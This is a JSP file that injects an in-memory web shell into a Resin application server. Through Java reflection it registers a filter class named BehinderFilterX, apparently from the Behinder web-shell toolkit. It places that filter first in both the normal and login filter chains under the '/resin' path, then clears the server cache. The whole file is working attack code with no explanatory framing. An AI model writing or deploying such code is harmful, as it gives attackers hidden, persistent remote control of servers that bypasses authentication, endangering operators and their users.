<%@ page import="com.caucho.server.webapp.WebApp" %>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%@ page import = "com.caucho.server.webapp.WebApp" %>
<%@ page import="com.caucho.server.dispatch.FilterConfigImpl" %>
<%@ page import="com.sorry.bug.BehinderFilterX" %>
<%@ page import="com.caucho.server.dispatch.FilterMapping" %>
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="com.caucho.server.dispatch.FilterMapper" %>
<%@ page import="java.util.ArrayList" %>
<%@ page import="com.sorry.bug.BehinderFilterX" %>
<%
  ClassLoader classloader = Thread.currentThread().getContextClassLoader();
  Class servletInvocationcls = classloader.loadClass("com.caucho.server.dispatch.ServletInvocation");
  Class filterConfigimplcls = classloader.loadClass("com.caucho.server.dispatch.FilterConfigImpl");
  Class filterMappingcls = classloader.loadClass("com.caucho.server.dispatch.FilterMapping");
  Class filterMappercls = classloader.loadClass("com.caucho.server.dispatch.FilterMapper");

  Object contextRequest = servletInvocationcls.getMethod("getContextRequest").invoke(null);
  WebApp webapp = (WebApp)contextRequest.getClass().getMethod("getWebApp").invoke(contextRequest);

  String newFilterStr = "newfilter";
  Filter newFilter = new BehinderFilterX();
  FilterConfigImpl filterConfigimpl = (FilterConfigImpl)filterConfigimplcls.newInstance();
  filterConfigimpl.setFilterName(newFilterStr);
  filterConfigimpl.setFilterClass(newFilter.getClass().getName());

  webapp.addFilter(filterConfigimpl);

  FilterMapping filterMapping = (FilterMapping)filterMappingcls.newInstance();
  FilterMapping.URLPattern filterMappingUrlpattern = filterMapping.createUrlPattern();
  filterMappingUrlpattern.addText("/resin");
  filterMappingUrlpattern.init();
  filterMapping.setFilterName(newFilterStr);
  filterMapping.setServletContext(webapp);


//set filtterMapper
  Field fieldWebappFilterMapper = null;
  try {
    fieldWebappFilterMapper = webapp.getClass().getDeclaredField("_filterMapper");
  }catch (NoSuchFieldException Exception){
    fieldWebappFilterMapper = webapp.getClass().getSuperclass().getDeclaredField("_filterMapper");
  }

  fieldWebappFilterMapper.setAccessible(true);
  FilterMapper filtermapper = (FilterMapper) fieldWebappFilterMapper.get(webapp);

  Field fieldFilterMapperFilterMap = filterMappercls.getDeclaredField("_filterMap");
  fieldFilterMapperFilterMap.setAccessible(true);

  ArrayList<FilterMapping> orginalfilterMappings = (ArrayList) fieldFilterMapperFilterMap.get(filtermapper);
  ArrayList<FilterMapping> newFilterMappings = new ArrayList(orginalfilterMappings.size() + 1);
  newFilterMappings.add(filterMapping);

  int count = 0;
  while(count < orginalfilterMappings.size()){
    newFilterMappings.add(orginalfilterMappings.get(count));
    ++ count;
  }

  fieldFilterMapperFilterMap.set(filtermapper, newFilterMappings);
  fieldWebappFilterMapper.set(webapp, filtermapper);

//set loginFilterMapper
  Field fieldWebappLoginFilterMapper = null;
  try{
    fieldWebappLoginFilterMapper = webapp.getClass().getDeclaredField("_loginFilterMapper");
  }catch (NoSuchFieldException Exception){
    fieldWebappLoginFilterMapper = webapp.getClass().getSuperclass().getDeclaredField("_loginFilterMapper");
  }

  fieldWebappLoginFilterMapper.setAccessible(true);
  FilterMapper loginFilterMapper = (FilterMapper)fieldWebappLoginFilterMapper.get(webapp);

  ArrayList<FilterMapping>  orginLoginFilterMappings = (ArrayList) fieldFilterMapperFilterMap.get(loginFilterMapper);
  ArrayList<FilterMapping> newLoginFilterMappings = new ArrayList(orginLoginFilterMappings.size() + 1);
  newLoginFilterMappings.add(filterMapping);

  count = 0;
  while( count < orginLoginFilterMappings.size()){
    newLoginFilterMappings.add(orginLoginFilterMappings.get(count));
    ++ count;
  }

  fieldFilterMapperFilterMap.set(loginFilterMapper, newLoginFilterMappings);
  fieldWebappLoginFilterMapper.set(webapp, loginFilterMapper);

  webapp.getClass().getMethod("clearCache").invoke(webapp);
%>